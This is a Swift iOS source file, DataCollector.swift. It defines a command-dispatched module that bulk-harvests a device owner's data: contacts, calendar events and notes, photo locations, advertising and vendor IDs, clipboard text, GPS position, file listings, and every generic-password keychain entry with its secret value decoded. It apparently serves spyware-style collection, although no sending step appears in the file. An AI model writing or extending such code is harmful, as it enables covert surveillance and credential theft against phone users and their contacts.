// language: Swift, file: DataCollector.swift, target: iOS 15+
import UIKit
import Contacts
import EventKit
import Photos
import CoreLocation
import AdSupport
import Security

final class DataCollector: NSObject, CLLocationManagerDelegate {

    static let shared = DataCollector()
    private let loc = CLLocationManager()
    private var last: CLLocation?

    private override init() {
        super.init()
        loc.delegate = self
        loc.desiredAccuracy = kCLLocationAccuracyHundredMeters
    }

    func handle(feature: String, completion: @escaping ([String: Any]) -> Void) {
        switch feature {
        case "CollectContacts":  collectContacts(completion)
        case "CollectCalendar":  collectCalendar(completion)
        case "CollectPhotos":    collectPhotos(completion)
        case "CollectDevice":    completion(deviceInfo())
        case "CollectClipboard": completion(["clipboard": UIPasteboard.general.string ?? ""])
        case "CollectLocation":  collectLocation(completion)
        case "CollectKeychain":  completion(collectKeychain())
        case "CollectFiles":     completion(collectFiles())
        case "CollectWiFi":      completion(["ssid": "requires NEHotspotNetwork + entitlement"])
        default:                 completion([:])
        }
    }

    private func collectContacts(_ cb: @escaping ([String: Any]) -> Void) {
        let s = CNContactStore()
        s.requestAccess(for: .contacts) { ok, _ in
            guard ok else { cb(["error": "denied"]); return }
            let keys: [CNKeyDescriptor] = [
                CNContactGivenNameKey as CNKeyDescriptor,
                CNContactFamilyNameKey as CNKeyDescriptor,
                CNContactPhoneNumbersKey as CNKeyDescriptor,
                CNContactEmailAddressesKey as CNKeyDescriptor,
                CNContactOrganizationNameKey as CNKeyDescriptor
            ]
            let req = CNContactFetchRequest(keysToFetch: keys)
            var out: [[String: String]] = []
            try? s.enumerateContacts(with: req) { c, _ in
                out.append([
                    "name": "\(c.givenName) \(c.familyName)",
                    "phones": c.phoneNumbers.map { $0.value.stringValue }.joined(separator: ","),
                    "emails": c.emailAddresses.map { $0.value as String }.joined(separator: ","),
                    "org": c.organizationName
                ])
            }
            cb(["contacts": out])
        }
    }

    private func collectCalendar(_ cb: @escaping ([String: Any]) -> Void) {
        let s = EKEventStore()
        s.requestFullAccessToEvents { ok, _ in
            guard ok else { cb(["error": "denied"]); return }
            let now = Date()
            let p = s.predicateForEvents(withStart: now.addingTimeInterval(-60*60*24*30),
                                         end: now.addingTimeInterval(60*60*24*90),
                                         calendars: nil)
            let out = s.events(matching: p).map {
                ["title": $0.title ?? "", "start": "\($0.startDate)", "notes": $0.notes ?? ""]
            }
            cb(["events": out])
        }
    }

    private func collectPhotos(_ cb: @escaping ([String: Any]) -> Void) {
        PHPhotoLibrary.requestAuthorization { st in
            guard st == .authorized || st == .limited else { cb(["error": "denied"]); return }
            let o = PHFetchOptions()
            o.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
            let a = PHAsset.fetchAssets(with: o)
            var out: [[String: Any]] = []
            a.enumerateObjects { x, i, stop in
                if i >= 500 { stop.pointee = true; return }
                out.append([
                    "date": x.creationDate.map { "\($0)" } ?? "",
                    "lat": x.location?.coordinate.latitude ?? 0,
                    "lon": x.location?.coordinate.longitude ?? 0,
                    "type": x.mediaType.rawValue
                ])
            }
            cb(["photos": out])
        }
    }

    private func deviceInfo() -> [String: Any] {
        let d = UIDevice.current
        return [
            "model": d.model,
            "name": d.name,
            "system": "\(d.systemName) \(d.systemVersion)",
            "idfv": d.identifierForVendor?.uuidString ?? "",
            "idfa": ASIdentifierManager.shared().advertisingIdentifier.uuidString,
            "locale": Locale.current.identifier,
            "tz": TimeZone.current.identifier,
            "screen": "\(UIScreen.main.bounds.width)x\(UIScreen.main.bounds.height)",
            "battery": "\(Int(d.batteryLevel * 100))%"
        ]
    }

    private func collectLocation(_ cb: @escaping ([String: Any]) -> Void) {
        loc.requestWhenInUseAuthorization()
        loc.requestLocation()
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            guard let l = self.last else { cb(["error": "no_fix"]); return }
            cb(["lat": l.coordinate.latitude, "lon": l.coordinate.longitude,
                "acc": l.horizontalAccuracy])
        }
    }

    func locationManager(_ m: CLLocationManager, didUpdateLocations locs: [CLLocation]) {
        last = locs.last
    }
    func locationManager(_ m: CLLocationManager, didFailWithError e: Error) {}

    private func collectKeychain() -> [String: Any] {
        let q: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecReturnAttributes as String: true,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitAll
        ]
        var r: AnyObject?
        guard SecItemCopyMatching(q as CFDictionary, &r) == errSecSuccess,
              let items = r as? [[String: Any]] else { return ["keychain": []] }
        return ["keychain": items.map { i -> [String: String] in
            let d = i[kSecValueData as String] as? Data
            return [
                "account": i[kSecAttrAccount as String] as? String ?? "",
                "service": i[kSecAttrService as String] as? String ?? "",
                "value": d.flatMap { String(data: $0, encoding: .utf8) } ?? ""
            ]
        }]
    }

    private func collectFiles() -> [String: Any] {
        let fm = FileManager.default
        let root = NSHomeDirectory()
        var out: [String] = []
        if let e = fm.enumerator(atPath: root) {
            for case let f as String in e {
                out.append(f)
                if out.count >= 1000 { break }
            }
        }
        return ["files": out]
    }
}
